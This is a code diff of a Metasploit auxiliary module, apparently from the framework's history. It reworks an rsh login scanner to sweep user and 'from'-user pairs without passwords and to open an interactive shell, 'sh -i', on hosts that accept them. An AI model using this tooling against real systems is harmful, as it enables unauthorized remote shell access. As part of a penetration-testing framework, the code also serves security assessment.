@@ -14,9 +14,9 @@ require 'msf/core'
 class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::Tcp
-	include Msf::Exploit::RServices
 	include Msf::Auxiliary::Report
 	include Msf::Auxiliary::AuthBrute
+	include Msf::Auxiliary::RServices
 	include Msf::Auxiliary::Scanner
 	include Msf::Auxiliary::CommandShell
 
@@ -48,6 +48,9 @@ class Metasploit3 < Msf::Auxiliary
 	def run_host(ip)
 		print_status("#{ip}:#{rport} - Starting rsh sweep")
 
+		cmd = datastore['CMD']
+		cmd ||= 'sh -i 2>&1'
+
 		if datastore['ENABLE_STDERR']
 			# For each host, bind a privileged listening port for the target to connect
 			# back to.
@@ -62,8 +65,8 @@ class Metasploit3 < Msf::Auxiliary
 
 		# The maximum time for a host is set here.
 		Timeout.timeout(300) {
-			each_user_pass { |user, pass|
-				do_login(user, pass, sd, lport)
+			each_user_fromuser { |user, fromuser|
+				do_login(user, fromuser, cmd, sd, lport)
 			}
 		}
 
@@ -71,13 +74,57 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 
-	def do_login(user, pass, sfd, lport)
-		vprint_status("#{target_host}:#{rport} - Attempting rsh with username:password '#{user}':'#{pass}'")
+	def each_user_fromuser(&block)
+		# Class variables to track credential use (for threading)
+		@@credentials_tried = {}
+		@@credentials_skipped = {}
+		
+		users = load_user_vars()
+		fromusers = load_fromuser_vars()
 
-		cmd = datastore['CMD']
-		cmd ||= 'sh -i 2>&1'
-		luser = datastore['LOCALUSER']
-		luser ||= 'root'
+		cleanup_files()
+
+		# We'll abuse this nice array combining function, despite its inaccurate name in this case :)
+		credentials = combine_users_and_passwords(users, fromusers)
+
+		fq_rest = "%s:%s:%s" % [datastore['RHOST'], datastore['RPORT'], "all remaining users"]
+
+		credentials.each do |u,fu|
+
+			break if @@credentials_skipped[fq_rest]
+
+			fq_user = "%s:%s:%s" % [datastore['RHOST'], datastore['RPORT'], u]
+
+			userpass_sleep_interval unless @@credentials_tried.empty?
+
+			next if @@credentials_skipped[fq_user]
+			next if @@credentials_tried[fq_user] == fu
+
+			ret = block.call(u, fu)
+
+			case ret
+			when :abort # Skip the current host entirely.
+				break
+
+			when :next_user # This means success for that user.
+				@@credentials_skipped[fq_user] = fu
+				if datastore['STOP_ON_SUCCESS'] # See?
+					@@credentials_skipped[fq_rest] = true
+				end
+
+			when :skip_user # Skip the user in non-success cases. 
+				@@credentials_skipped[fq_user] = fu
+
+			when :connection_error # Report an error, skip this cred, but don't abort.
+				vprint_error "#{datastore['RHOST']}:#{datastore['RPORT']} - Connection error, skipping '#{u}' from '#{fu}'"
+			end
+			@@credentials_tried[fq_user] = fu
+		end
+	end
+
+
+	def do_login(user, luser, cmd, sfd, lport)
+		vprint_status("#{target_host}:#{rport} - Attempting rsh with username '#{user}' from '#{luser}'")
 
 		# We must connect from a privileged port.
 		return :abort if not connect_from_privileged_port(1022)
@@ -91,10 +138,6 @@ class Metasploit3 < Msf::Auxiliary
 			stderr_sock = nil
 		end
 
-		# Read the expected nul byte response.
-		buf = sock.get_once(1)
-		return :abort if buf != "\x00"
-
 		# NOTE: We report this here, since we are awfully convinced now that this is really
 		# an rsh service.
 		report_service(
@@ -104,9 +147,17 @@ class Metasploit3 < Msf::Auxiliary
 			:name => 'rsh'
 		)
 
+		# Read the expected nul byte response.
+		buf = sock.get_once(1)
+		if buf != "\x00"
+			buf = sock.get_once(-1)
+			vprint_error("Result: #{buf.gsub(/[[:space:]]+/, ' ')}")
+			return :failed
+		end
+
 		# should we report a vuln here? rsh allowed w/o password?!
 		print_good("#{target_host}:#{rport}, rsh '#{user}' from '#{luser}' with no password.")
-		start_rsh_session(rhost, rport, user, luser, pass, buf, stderr_sock)
+		start_rsh_session(rhost, rport, user, luser, buf, stderr_sock)
 
 		return :next_user
 
@@ -153,25 +204,22 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 
-	def start_rsh_session(host, port, user, luser, pass, proof, stderr_sock)
+	def start_rsh_session(host, port, user, luser, proof, stderr_sock)
 		report_auth_info(
 			:host	=> host,
 			:port	=> port,
 			:sname => 'rsh',
 			:user	=> user,
 			:luser => luser,
-			:pass	=> pass,
 			:proof  => proof,
 			:active => true
 		)
 
 		merge_me = {
-			'USERPASS_FILE' => nil,
 			'USER_FILE'     => nil,
-			'PASS_FILE'     => nil,
+			'FROMUSER_FILE' => nil,
 			'USERNAME'      => user,
-			'LOCALUSER'     => luser,
-			'PASSWORD'      => pass,
+			'FROMUSER'      => user,
 			# Save a reference to the socket so we don't GC prematurely
 			:stderr_sock    => stderr_sock
 		}
@@ -179,7 +227,7 @@ class Metasploit3 < Msf::Auxiliary
 		# Don't tie the life of this socket to the exploit
 		self.sockets.delete(stderr_sock)
 
-		start_session(self, "RSH #{user}:#{pass} (#{host}:#{port})", merge_me)
+		start_session(self, "RSH #{user} from #{luser} (#{host}:#{port})", merge_me)
 	end
 
 end
